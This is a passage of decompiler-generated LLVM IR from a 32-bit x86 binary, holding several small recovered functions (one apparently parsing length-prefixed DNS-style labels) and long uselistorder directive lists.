  %v3_8051dcb = add i32 %v0_8051dc9, 1
  %v4_8051dcb = add i32 %v3_8051dcb, %v2_8051dcb
  br label %dec_label_pc_8051dd3

dec_label_pc_8051dd0:                             ; preds = %dec_label_pc_8051d64, %dec_label_pc_8051d04
  br label %dec_label_pc_8051dd3

dec_label_pc_8051dd3:                             ; preds = %dec_label_pc_8051dc4, %dec_label_pc_8051dd0
  %storemerge = phi i32 [ %v4_8051dcb, %dec_label_pc_8051dc4 ], [ -1, %dec_label_pc_8051dd0 ]
  store i32 %v0_8051d06, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8051d81.ph47, { 2, 1, 0 }
  uselistorder i8 %v4_8051db8, { 1, 0 }
  uselistorder i32 %v2_8051d5b, { 0, 2, 1 }
  uselistorder i32 %v4_8051d4c, { 0, 2, 1 }
  uselistorder i32 %v5_8051db837, { 4, 3, 1, 2, 0 }
  uselistorder i32* %ebp.global-to-local, { 3, 0, 2, 1, 4, 5 }
  uselistorder i8 1, { 0, 5, 8, 1, 7, 6, 4, 2, 3 }
  uselistorder i8 46, { 6, 7, 0, 1, 2, 3, 4, 5 }
  uselistorder i32 (i16*, i32, i32)* @function_804ce38, { 1, 2, 3, 4, 12, 13, 14, 7, 8, 15, 16, 18, 6, 5, 9, 10, 11, 17, 0 }
  uselistorder i32* @edi, { 2, 70, 71, 21, 72, 73, 74, 20, 75, 142, 143, 76, 3, 77, 0, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 23, 5, 4, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 93, 6, 94, 7, 95, 96, 97, 98, 103, 104, 1, 99, 100, 101, 102, 201, 8, 202, 203, 204, 105, 106, 107, 108, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 38, 39, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 9, 216, 217, 218, 219, 220, 221, 222, 260, 261, 10, 262, 263, 11, 266, 267, 52, 53, 268, 269, 270, 271, 272, 273, 22, 274, 275, 284, 57, 12, 58, 59, 60, 40, 41, 42, 43, 44, 45, 46, 61, 13, 62, 63, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 14, 196, 197, 198, 199, 200, 125, 126, 15, 127, 128, 129, 130, 131, 132, 133, 109, 110, 111, 112, 223, 224, 16, 225, 226, 227, 282, 283, 228, 229, 230, 17, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 134, 135, 136, 137, 154, 155, 156, 231, 232, 233, 234, 235, 236, 237, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 18, 252, 47, 48, 49, 238, 19, 239, 240, 278, 279, 280, 281, 157, 158, 159, 160, 161, 162, 54, 55, 56, 253, 254, 255, 256, 163, 164, 165, 168, 169, 170, 264, 265, 64, 65, 276, 277, 166, 167, 50, 51, 66, 67, 68, 69, 138, 139, 140, 141, 171, 172, 257, 258, 259 }
  uselistorder i32 256, { 1, 2, 3, 4, 5, 6, 7, 51, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 50, 18, 19, 20, 23, 21, 22, 24, 25, 26, 45, 46, 27, 47, 52, 57, 53, 28, 29, 58, 30, 31, 0, 55, 56, 48, 32, 49, 33, 34, 35, 59, 36, 37, 38, 39, 40, 41, 42, 43, 54, 44 }
  uselistorder i8 64, { 0, 6, 2, 3, 7, 8, 4, 5, 1 }
  uselistorder i1 true, { 0, 5, 6, 1, 2, 3, 4 }
  uselistorder i32* @edx, { 6, 40, 41, 42, 43, 44, 45, 46, 47, 19, 2, 51, 49, 50, 1, 52, 53, 54, 55, 56, 57, 58, 59, 21, 22, 23, 24, 25, 60, 61, 62, 63, 64, 65, 66, 72, 67, 68, 69, 70, 71, 3, 20, 185, 186, 187, 188, 189, 190, 191, 233, 73, 74, 76, 75, 4, 77, 78, 79, 80, 81, 7, 26, 192, 193, 104, 105, 8, 106, 107, 108, 194, 195, 196, 197, 198, 199, 200, 235, 236, 237, 238, 9, 239, 240, 242, 119, 243, 120, 0, 28, 29, 27, 244, 245, 103, 121, 247, 248, 250, 249, 118, 30, 124, 125, 10, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 11, 139, 140, 122, 123, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 12, 178, 179, 180, 181, 182, 183, 184, 82, 83, 85, 86, 87, 35, 5, 13, 48, 84, 201, 88, 89, 14, 90, 109, 110, 111, 91, 92, 93, 94, 112, 202, 203, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 18, 221, 222, 204, 223, 15, 224, 225, 227, 16, 228, 229, 230, 231, 232, 31, 17, 226, 246, 113, 114, 115, 241, 234, 251, 32, 33, 34, 36, 37, 38, 39, 95, 96, 97, 98, 99, 100, 101, 102, 116, 117, 252 }
  uselistorder i32* @esi, { 77, 78, 79, 80, 81, 82, 33, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 34, 38, 39, 9, 7, 40, 41, 42, 43, 44, 45, 103, 10, 104, 105, 109, 106, 107, 108, 116, 110, 111, 112, 113, 114, 115, 117, 118, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 11, 243, 244, 12, 119, 120, 121, 13, 122, 123, 128, 129, 130, 131, 132, 133, 134, 135, 1, 136, 137, 138, 139, 140, 141, 142, 143, 46, 47, 48, 307, 308, 309, 310, 144, 145, 245, 246, 247, 248, 0, 249, 58, 59, 311, 312, 313, 314, 37, 315, 316, 317, 325, 326, 327, 328, 63, 64, 65, 66, 67, 68, 69, 318, 323, 324, 49, 50, 51, 52, 70, 71, 72, 2, 73, 74, 75, 53, 54, 55, 56, 205, 209, 14, 210, 211, 212, 213, 214, 215, 216, 206, 207, 208, 217, 218, 219, 220, 221, 222, 223, 3, 224, 225, 226, 227, 15, 228, 35, 229, 230, 231, 232, 146, 147, 148, 151, 152, 153, 154, 329, 16, 330, 331, 124, 125, 126, 127, 250, 17, 251, 36, 30, 149, 150, 155, 156, 338, 339, 252, 253, 254, 255, 256, 257, 258, 157, 158, 159, 160, 161, 162, 163, 175, 18, 8, 176, 177, 178, 179, 180, 19, 31, 181, 182, 183, 184, 185, 164, 165, 166, 167, 168, 169, 186, 20, 187, 188, 259, 260, 261, 262, 22, 263, 4, 265, 266, 267, 268, 21, 269, 270, 264, 271, 272, 273, 274, 5, 275, 276, 277, 278, 279, 280, 32, 23, 281, 282, 24, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 25, 300, 301, 302, 26, 57, 283, 6, 284, 285, 319, 320, 321, 322, 332, 333, 334, 335, 336, 337, 189, 190, 191, 192, 27, 193, 194, 195, 196, 60, 61, 62, 303, 304, 305, 306, 197, 198, 199, 200, 201, 28, 29, 202, 203, 173, 174, 76, 170, 171, 172, 204, 340 }
  uselistorder i32 %arg1, { 1, 3, 2, 4, 0, 5 }
  uselistorder label %dec_label_pc_8051dd3, { 1, 0 }
  uselistorder label %dec_label_pc_8051d98, { 1, 0 }
}

define i32 @function_8051ddc(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8051ddc:
  %v1_8051dea = icmp eq i32 %arg1, 0
  br i1 %v1_8051dea, label %dec_label_pc_8051e19, label %dec_label_pc_8051e0a.preheader

dec_label_pc_8051e0a.preheader:                   ; preds = %dec_label_pc_8051ddc
  store i32 %arg2, i32* @ecx, align 4
  %v2_8051e0a10 = add i32 %arg2, %arg1
  %v3_8051e0a11 = inttoptr i32 %v2_8051e0a10 to i8*
  %v4_8051e0a12 = load i8, i8* %v3_8051e0a11, align 1
  %v1_8051e0e14 = add i32 %arg2, 1
  %v1_8051e1115 = icmp eq i8 %v4_8051e0a12, 0
  %v1_8051e1316 = icmp eq i1 %v1_8051e1115, false
  br i1 %v1_8051e1316, label %dec_label_pc_8051df9, label %dec_label_pc_8051e15

dec_label_pc_8051df0:                             ; preds = %dec_label_pc_8051df9
  %v1_8051df0 = add i32 %v0_8051df017, 2
  br label %dec_label_pc_8051e15

dec_label_pc_8051df9:                             ; preds = %dec_label_pc_8051e0a.preheader, %dec_label_pc_8051e0a
  %v1_8051e0e19 = phi i32 [ %v1_8051e0e, %dec_label_pc_8051e0a ], [ %v1_8051e0e14, %dec_label_pc_8051e0a.preheader ]
  %v5_8051e0a18.in = phi i8 [ %v4_8051e0a, %dec_label_pc_8051e0a ], [ %v4_8051e0a12, %dec_label_pc_8051e0a.preheader ]
  %v0_8051df017 = phi i32 [ %v2_8051e07, %dec_label_pc_8051e0a ], [ %arg2, %dec_label_pc_8051e0a.preheader ]
  %v5_8051e0a18 = zext i8 %v5_8051e0a18.in to i32
  %v1_8051dfb = and i32 %v5_8051e0a18, 192
  %v6_8051e00 = icmp eq i32 %v1_8051dfb, 192
  %v2_8051e07 = add i32 %v5_8051e0a18, %v1_8051e0e19
  br i1 %v6_8051e00, label %dec_label_pc_8051df0, label %dec_label_pc_8051e0a

dec_label_pc_8051e0a:                             ; preds = %dec_label_pc_8051df9
  store i32 %v2_8051e07, i32* @ecx, align 4
  %v2_8051e0a = add i32 %v2_8051e07, %arg1
  %v3_8051e0a = inttoptr i32 %v2_8051e0a to i8*
  %v4_8051e0a = load i8, i8* %v3_8051e0a, align 1
  %v1_8051e0e = add i32 %v2_8051e07, 1
  %v1_8051e11 = icmp eq i8 %v4_8051e0a, 0
  %v1_8051e13 = icmp eq i1 %v1_8051e11, false
  br i1 %v1_8051e13, label %dec_label_pc_8051df9, label %dec_label_pc_8051e15

dec_label_pc_8051e15:                             ; preds = %dec_label_pc_8051e0a.preheader, %dec_label_pc_8051e0a, %dec_label_pc_8051df0
  %v0_8051e15 = phi i32 [ %v1_8051df0, %dec_label_pc_8051df0 ], [ %v1_8051e0e14, %dec_label_pc_8051e0a.preheader ], [ %v1_8051e0e, %dec_label_pc_8051e0a ]
  %v2_8051e17 = sub i32 %v0_8051e15, %arg2
  br label %dec_label_pc_8051e19

dec_label_pc_8051e19:                             ; preds = %dec_label_pc_8051ddc, %dec_label_pc_8051e15
  %v0_8051e1c = phi i32 [ -1, %dec_label_pc_8051ddc ], [ %v2_8051e17, %dec_label_pc_8051e15 ]
  ret i32 %v0_8051e1c

; uselistorder directives
  uselistorder i8 %v4_8051e0a, { 1, 0 }
  uselistorder i32 %v2_8051e07, { 2, 3, 1, 0 }
  uselistorder i32 192, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 2, { 87, 19, 88, 18, 52, 92, 93, 21, 25, 24, 89, 94, 95, 96, 77, 97, 98, 99, 100, 101, 102, 79, 26, 80, 81, 32, 103, 104, 27, 53, 33, 118, 34, 28, 119, 48, 105, 106, 107, 108, 78, 109, 110, 1, 40, 37, 120, 121, 49, 2, 41, 42, 50, 128, 38, 76, 0, 54, 72, 55, 73, 56, 74, 35, 3, 84, 22, 57, 4, 5, 6, 7, 117, 8, 9, 51, 10, 58, 111, 112, 113, 114, 29, 43, 85, 36, 90, 91, 11, 129, 44, 30, 31, 122, 123, 39, 12, 13, 124, 23, 14, 125, 15, 45, 126, 127, 116, 130, 82, 59, 83, 61, 60, 63, 62, 46, 65, 47, 64, 86, 16, 67, 17, 66, 75, 20, 115, 69, 68, 70, 71 }
  uselistorder i8 0, { 26, 3, 6, 7, 27, 5, 4, 62, 63, 64, 9, 71, 66, 67, 8, 69, 70, 68, 23, 72, 0, 1, 40, 41, 73, 74, 25, 75, 10, 12, 43, 42, 11, 28, 76, 77, 103, 126, 127, 15, 83, 79, 80, 78, 13, 81, 82, 14, 24, 84, 85, 86, 87, 88, 89, 90, 91, 92, 17, 45, 44, 16, 46, 47, 104, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 2, 144, 145, 146, 169, 147, 170, 173, 53, 29, 37, 54, 18, 172, 116, 117, 118, 119, 120, 121, 122, 123, 124, 30, 125, 56, 19, 65, 148, 149, 38, 150, 93, 94, 95, 105, 106, 107, 108, 109, 151, 152, 153, 154, 155, 156, 157, 20, 158, 159, 21, 160, 161, 162, 163, 164, 165, 166, 167, 48, 171, 110, 111, 112, 168, 113, 114, 49, 50, 51, 52, 55, 57, 58, 59, 60, 61, 96, 97, 98, 99, 100, 101, 102, 115, 174, 175, 22, 39, 31, 32, 33, 34, 35, 36 }
  uselistorder i32* @ecx, { 24, 4, 6, 23, 5, 44, 47, 12, 48, 49, 50, 51, 13, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 33, 34, 35, 36, 37, 38, 68, 69, 7, 8, 39, 0, 85, 136, 196, 10, 16, 70, 71, 14, 9, 15, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 1, 40, 137, 138, 29, 139, 86, 87, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 25, 165, 166, 167, 168, 169, 170, 26, 171, 22, 197, 198, 199, 200, 28, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 17, 115, 90, 91, 92, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 18, 130, 131, 133, 134, 135, 132, 82, 45, 46, 172, 30, 31, 83, 88, 173, 174, 175, 176, 177, 178, 179, 27, 180, 11, 181, 182, 183, 184, 185, 19, 20, 2, 3, 186, 187, 21, 188, 189, 190, 191, 192, 194, 195, 41, 42, 193, 201, 89, 43, 202, 84, 32 }
  uselistorder i32 %arg2, { 4, 0, 1, 2, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051e19, { 1, 0 }
  uselistorder label %dec_label_pc_8051e15, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8051df9, { 1, 0 }
}

define i32 @function_8051e20() local_unnamed_addr {
dec_label_pc_8051e20:
  %stack_var_-16 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp6, i32* %stack_var_-16, align 4
  %v0_8051e2c = load i32, i32* @global_var_8055648.173, align 8
  %v10_8051e31 = icmp eq i32 %v0_8051e2c, -1
  br i1 %v10_8051e31, label %dec_label_pc_8051e42, label %dec_label_pc_8051e36.preheader

dec_label_pc_8051e36.preheader:                   ; preds = %dec_label_pc_8051e20
  br label %dec_label_pc_8051e36

dec_label_pc_8051e36:                             ; preds = %dec_label_pc_8051e36.preheader, %dec_label_pc_8051e36
  %v4_8051e39 = phi i32 [ %v0_8051e2c, %dec_label_pc_8051e36.preheader ], [ %v2_8051e3b, %dec_label_pc_8051e36 ]
  %v0_8051e36 = phi i32 [ ptrtoint (i32* @global_var_8055648.173 to i32), %dec_label_pc_8051e36.preheader ], [ %v1_8051e36, %dec_label_pc_8051e36 ]
  %v1_8051e36 = add i32 %v0_8051e36, -4
  call void @__pseudo_call(i32 %v4_8051e39)
  %v1_8051e3b = inttoptr i32 %v1_8051e36 to i32*
  %v2_8051e3b = load i32, i32* %v1_8051e3b, align 4
  %v10_8051e3d = icmp eq i32 %v2_8051e3b, -1
  %v1_8051e40 = icmp eq i1 %v10_8051e3d, false
  br i1 %v1_8051e40, label %dec_label_pc_8051e36, label %dec_label_pc_8051e42.loopexit

dec_label_pc_8051e42.loopexit:                    ; preds = %dec_label_pc_8051e36
  %v2_8051e42.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8051e42

dec_label_pc_8051e42:                             ; preds = %dec_label_pc_8051e42.loopexit, %dec_label_pc_8051e20
  %v2_8051e42 = phi i32 [ %v2_8051e42.pre, %dec_label_pc_8051e42.loopexit ], [ %tmp6, %dec_label_pc_8051e20 ]
  ret i32 %v2_8051e42

; uselistorder directives
  uselistorder i32 %v0_8051e2c, { 1, 0 }
  uselistorder i1 false, { 438, 148, 4, 0, 1, 6, 149, 151, 150, 5, 153, 152, 154, 28, 8, 29, 163, 158, 162, 160, 161, 36, 155, 156, 159, 7, 164, 165, 166, 167, 53, 55, 56, 57, 58, 54, 59, 60, 61, 62, 63, 64, 168, 169, 174, 30, 170, 171, 173, 172, 175, 176, 181, 180, 177, 178, 179, 9, 10, 65, 66, 67, 37, 182, 183, 184, 256, 257, 258, 324, 325, 326, 259, 31, 260, 261, 327, 328, 329, 289, 108, 32, 12, 185, 186, 187, 188, 190, 189, 11, 191, 192, 33, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 208, 207, 13, 68, 69, 70, 71, 330, 331, 332, 209, 210, 262, 263, 264, 333, 334, 335, 336, 337, 338, 339, 47, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 439, 440, 35, 367, 38, 368, 369, 370, 290, 291, 292, 99, 441, 455, 456, 457, 458, 459, 462, 39, 463, 464, 461, 454, 442, 72, 109, 110, 111, 112, 113, 114, 443, 444, 126, 127, 128, 129, 130, 131, 14, 115, 15, 116, 117, 286, 73, 447, 448, 449, 450, 451, 452, 453, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 293, 306, 307, 308, 309, 310, 311, 312, 313, 26, 315, 314, 319, 316, 317, 318, 16, 320, 321, 211, 212, 214, 215, 137, 2, 3, 140, 139, 138, 17, 460, 157, 371, 372, 373, 40, 374, 18, 213, 216, 375, 376, 217, 218, 219, 220, 221, 222, 267, 265, 266, 19, 34, 268, 270, 269, 41, 271, 273, 272, 42, 274, 223, 224, 275, 100, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 396, 395, 20, 397, 398, 399, 400, 401, 403, 27, 404, 402, 405, 407, 406, 21, 408, 409, 411, 410, 43, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 74, 75, 445, 44, 446, 22, 276, 277, 278, 279, 280, 101, 45, 102, 103, 104, 105, 106, 107, 436, 281, 282, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 118, 119, 120, 121, 122, 123, 124, 125, 132, 133, 134, 135, 136, 141, 142, 143, 144, 145, 146, 147, 225, 226, 227, 49, 24, 228, 229, 230, 231, 232, 233, 50, 23, 234, 235, 236, 51, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 25, 248, 249, 250, 251, 252, 48, 253, 254, 255, 283, 284, 285, 287, 288, 322, 323, 437, 465, 52, 46, 466 }
  uselistorder void (i32)* @__pseudo_call, { 2, 1, 4, 5, 6, 7, 3, 0 }
  uselistorder i32 -4, { 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 5, 20, 34, 35, 36, 37, 40, 41, 42, 43, 2, 44, 0, 39, 45, 46, 47, 48, 49, 50, 6, 38, 51, 52, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 3, 32, 4, 33, 7, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_8055648.173 to i32), { 1, 3, 4, 0, 5, 6, 2 }
  uselistorder i32 -1, { 29, 30, 63, 10, 157, 168, 15, 280, 64, 169, 65, 170, 281, 66, 67, 171, 68, 31, 20, 69, 24, 172, 173, 32, 33, 34, 72, 71, 70, 174, 125, 126, 19, 18, 17, 175, 176, 278, 73, 177, 5, 282, 178, 283, 284, 179, 180, 285, 158, 74, 181, 302, 182, 183, 184, 75, 185, 0, 186, 187, 188, 189, 190, 286, 36, 287, 37, 288, 289, 191, 145, 146, 147, 137, 139, 140, 141, 142, 143, 144, 138, 6, 136, 127, 192, 133, 134, 135, 148, 132, 149, 150, 151, 152, 153, 154, 155, 128, 131, 35, 194, 193, 61, 7, 195, 196, 290, 291, 38, 16, 76, 197, 58, 198, 303, 199, 77, 78, 200, 79, 201, 159, 202, 80, 203, 204, 156, 82, 81, 205, 206, 207, 84, 83, 85, 208, 209, 39, 11, 210, 211, 86, 87, 212, 59, 60, 213, 88, 89, 214, 90, 215, 91, 216, 92, 217, 93, 218, 94, 219, 95, 220, 96, 221, 97, 222, 98, 223, 99, 224, 100, 225, 101, 226, 102, 227, 103, 228, 104, 229, 40, 230, 62, 105, 106, 231, 232, 233, 234, 235, 236, 108, 107, 109, 237, 110, 238, 21, 239, 160, 240, 308, 241, 242, 41, 299, 300, 44, 43, 45, 46, 25, 47, 111, 48, 243, 42, 301, 8, 292, 295, 112, 244, 113, 304, 245, 246, 293, 294, 247, 296, 297, 309, 114, 115, 248, 249, 250, 22, 251, 252, 253, 12, 254, 13, 305, 306, 14, 255, 256, 307, 2, 49, 50, 1, 257, 166, 167, 258, 161, 259, 9, 129, 130, 116, 298, 260, 117, 261, 118, 262, 119, 263, 120, 264, 121, 265, 122, 266, 123, 267, 124, 268, 51, 279, 269, 52, 3, 4, 162, 163, 164, 53, 270, 54, 271, 272, 23, 273, 26, 27, 28, 55, 56, 57, 274, 275, 276, 277, 165 }
  uselistorder i32 1, { 377, 676, 223, 620, 677, 218, 678, 141, 679, 253, 680, 681, 125, 682, 378, 60, 380, 379, 54, 211, 254, 255, 683, 225, 686, 344, 687, 688, 689, 224, 690, 236, 366, 45, 44, 691, 692, 382, 381, 172, 693, 383, 694, 384, 207, 695, 696, 385, 163, 164, 624, 625, 626, 627, 628, 629, 630, 631, 632, 390, 389, 388, 387, 386, 149, 148, 147, 150, 633, 634, 635, 393, 392, 391, 181, 183, 182, 184, 186, 185, 284, 697, 698, 212, 364, 699, 700, 256, 701, 307, 702, 703, 394, 86, 0, 1, 707, 704, 705, 706, 226, 395, 122, 121, 636, 637, 638, 257, 639, 708, 709, 710, 396, 168, 167, 165, 169, 166, 309, 711, 96, 258, 259, 83, 84, 82, 85, 260, 397, 117, 285, 237, 399, 398, 112, 113, 400, 171, 401, 118, 286, 287, 402, 288, 289, 403, 311, 404, 213, 712, 713, 220, 714, 261, 227, 228, 715, 716, 219, 718, 719, 720, 721, 722, 262, 407, 406, 405, 723, 724, 725, 726, 727, 728, 729, 730, 217, 238, 731, 263, 732, 733, 734, 264, 735, 736, 265, 737, 738, 739, 740, 741, 312, 410, 409, 408, 40, 39, 41, 290, 291, 742, 743, 744, 745, 229, 640, 641, 642, 9, 411, 822, 412, 114, 115, 292, 767, 367, 162, 308, 823, 824, 825, 266, 313, 826, 413, 827, 267, 828, 829, 425, 424, 423, 422, 421, 420, 419, 418, 417, 416, 415, 414, 192, 187, 189, 190, 195, 193, 188, 194, 191, 196, 830, 831, 2, 22, 21, 20, 19, 18, 426, 201, 202, 427, 16, 17, 832, 833, 428, 98, 97, 99, 867, 868, 869, 24, 25, 23, 429, 834, 430, 10, 14, 15, 11, 13, 12, 835, 293, 433, 432, 431, 434, 48, 435, 87, 436, 437, 126, 106, 438, 109, 440, 439, 111, 441, 208, 442, 55, 443, 180, 444, 179, 445, 206, 446, 447, 110, 448, 151, 450, 449, 47, 451, 42, 452, 137, 119, 454, 453, 132, 455, 459, 458, 457, 456, 100, 872, 873, 874, 462, 461, 460, 38, 37, 875, 294, 464, 463, 466, 465, 197, 295, 352, 616, 239, 472, 471, 470, 469, 468, 467, 123, 124, 870, 475, 474, 473, 160, 158, 159, 314, 476, 665, 666, 667, 347, 668, 477, 75, 76, 77, 74, 78, 296, 478, 79, 80, 660, 214, 221, 661, 368, 479, 129, 131, 128, 130, 480, 93, 91, 89, 90, 95, 94, 92, 67, 64, 66, 68, 63, 65, 315, 482, 481, 316, 483, 317, 484, 318, 487, 486, 485, 353, 490, 489, 488, 173, 319, 789, 790, 791, 491, 120, 792, 793, 230, 794, 795, 796, 71, 69, 70, 354, 788, 268, 203, 205, 204, 320, 797, 798, 799, 800, 801, 802, 803, 804, 805, 269, 806, 807, 808, 809, 810, 299, 811, 812, 210, 300, 813, 814, 815, 816, 297, 298, 817, 818, 819, 494, 493, 492, 144, 143, 142, 146, 145, 355, 495, 496, 497, 498, 499, 500, 501, 502, 746, 240, 747, 321, 251, 322, 751, 241, 507, 506, 505, 504, 503, 101, 102, 508, 509, 670, 671, 672, 231, 301, 673, 512, 511, 510, 116, 513, 717, 514, 161, 684, 685, 836, 837, 376, 515, 138, 838, 748, 749, 750, 517, 516, 53, 52, 51, 752, 753, 518, 8, 7, 6, 877, 519, 134, 135, 133, 520, 521, 302, 754, 755, 756, 369, 61, 62, 768, 769, 770, 270, 46, 323, 324, 325, 771, 522, 326, 327, 772, 271, 3, 524, 523, 170, 328, 757, 758, 525, 49, 50, 329, 526, 88, 303, 527, 36, 839, 840, 617, 273, 841, 842, 843, 844, 845, 847, 848, 849, 274, 850, 851, 356, 272, 852, 275, 853, 854, 855, 846, 531, 530, 529, 528, 32, 34, 33, 29, 31, 30, 35, 856, 532, 157, 154, 156, 155, 276, 533, 857, 858, 535, 534, 26, 27, 859, 860, 244, 243, 235, 861, 304, 862, 863, 242, 864, 277, 865, 330, 866, 537, 536, 57, 58, 56, 59, 278, 331, 4, 332, 538, 539, 108, 107, 871, 541, 540, 177, 178, 305, 876, 542, 176, 333, 209, 334, 773, 774, 775, 776, 777, 778, 779, 780, 252, 781, 546, 545, 544, 543, 72, 73, 335, 279, 336, 337, 310, 345, 550, 549, 548, 547, 81, 338, 553, 552, 551, 556, 555, 554, 43, 557, 339, 782, 783, 340, 341, 784, 559, 558, 561, 560, 127, 562, 28, 563, 140, 565, 564, 136, 566, 103, 567, 174, 568, 175, 569, 200, 643, 644, 645, 646, 647, 306, 570, 576, 575, 574, 573, 572, 571, 198, 199, 648, 649, 650, 222, 651, 652, 653, 654, 655, 656, 657, 658, 659, 370, 662, 357, 358, 371, 581, 580, 579, 372, 578, 577, 153, 663, 664, 359, 360, 618, 587, 373, 586, 585, 374, 584, 583, 582, 139, 669, 342, 361, 588, 619, 362, 594, 593, 592, 591, 590, 589, 674, 215, 216, 675, 245, 596, 595, 152, 246, 247, 248, 249, 759, 760, 280, 233, 761, 762, 763, 621, 281, 232, 764, 765, 622, 363, 602, 601, 600, 599, 598, 597, 104, 105, 282, 603, 283, 766, 623, 343, 365, 609, 608, 607, 606, 605, 604, 785, 786, 787, 610, 375, 234, 250, 346, 820, 5, 821, 611, 348, 878, 879, 349, 880, 881, 350, 351, 882, 883, 612, 614, 613, 615 }
  uselistorder label %dec_label_pc_8051e36, { 1, 0 }
}

define i32 @function_8051e48() local_unnamed_addr {
entry:
  %v0_8051e4b = load i32, i32* @ebx, align 4
  %v1_8051e4c = call i32 @function_80480b0(i32 %v0_8051e4b)
  store i32 %v1_8051e4c, i32* @eax, align 4
  %v0_8051e57 = call i32 @function_80480c0()
  ret i32 %v0_8051e57

; uselistorder directives
  uselistorder i32* @eax, { 15, 2, 46, 119, 4, 120, 121, 3, 122, 0, 45, 1, 118, 123, 47, 124, 83, 84, 85, 57, 86, 125, 127, 126, 7, 8, 188, 189, 178, 199, 128, 48, 129, 49, 130, 131, 132, 50, 133, 5, 51, 52, 134, 135, 53, 136, 77, 137, 138, 78, 79, 80, 139, 140, 141, 142, 54, 143, 144, 145, 146, 55, 153, 18, 201, 81, 202, 203, 205, 82, 206, 9, 204, 12, 14, 200, 100, 16, 87, 88, 175, 89, 179, 181, 182, 180, 183, 184, 186, 187, 185, 147, 56, 110, 111, 112, 113, 114, 10, 154, 155, 156, 66, 157, 158, 159, 160, 161, 148, 149, 162, 163, 92, 93, 190, 192, 191, 193, 194, 196, 90, 195, 164, 165, 67, 166, 167, 94, 95, 96, 19, 20, 97, 21, 98, 99, 168, 68, 69, 169, 70, 170, 71, 72, 171, 91, 17, 22, 23, 24, 25, 101, 26, 27, 102, 28, 29, 30, 31, 103, 32, 33, 104, 34, 35, 105, 36, 37, 38, 39, 106, 40, 107, 108, 109, 41, 42, 43, 44, 115, 116, 117, 75, 76, 6, 150, 58, 59, 151, 152, 60, 61, 62, 63, 64, 65, 172, 73, 173, 74, 174, 176, 177, 207, 197, 198, 11, 13 }
  uselistorder i32 (i32)* @function_80480b0, { 1, 0 }
  uselistorder i32 0, { 570, 13, 14, 15, 46, 380, 571, 574, 572, 573, 381, 41, 699, 763, 764, 18, 48, 577, 585, 579, 580, 19, 39, 581, 582, 583, 382, 584, 47, 100, 101, 102, 575, 576, 109, 586, 587, 589, 590, 588, 591, 218, 592, 593, 594, 595, 596, 597, 110, 111, 383, 257, 258, 87, 463, 384, 464, 465, 51, 52, 466, 467, 468, 374, 469, 50, 385, 49, 386, 112, 0, 1, 387, 113, 114, 388, 389, 390, 115, 391, 600, 392, 598, 205, 599, 259, 260, 116, 2, 3, 393, 601, 602, 603, 604, 605, 261, 394, 395, 20, 53, 471, 88, 89, 396, 606, 54, 397, 21, 117, 765, 262, 700, 701, 702, 766, 767, 12, 219, 119, 118, 768, 769, 220, 770, 771, 120, 121, 398, 703, 122, 704, 399, 772, 400, 773, 774, 775, 776, 607, 734, 123, 401, 4, 470, 5, 896, 518, 519, 124, 263, 608, 609, 610, 612, 95, 22, 613, 55, 614, 615, 616, 617, 618, 619, 625, 626, 627, 628, 620, 621, 622, 623, 624, 56, 57, 402, 629, 630, 58, 59, 60, 403, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 125, 649, 650, 126, 651, 652, 653, 61, 96, 221, 103, 404, 97, 777, 127, 